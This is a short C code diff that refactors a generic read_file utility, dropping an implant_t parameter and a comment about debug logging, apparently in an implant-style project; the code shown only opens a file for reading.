@@ -23,11 +23,8 @@
 
 /*
    just a little utility function to read a generic text file.
-
-   implant_t struct is required to have debug logging. i should maybe
-   find a way to make this suck less, but we're not smart devs over here
 */
-int read_file(char const *path, char **buffer, implant_t *instance) {
+int read_file(char const *path, char **buffer) {
 
     int fd = open(path, O_RDONLY);
     if (0 > fd) {
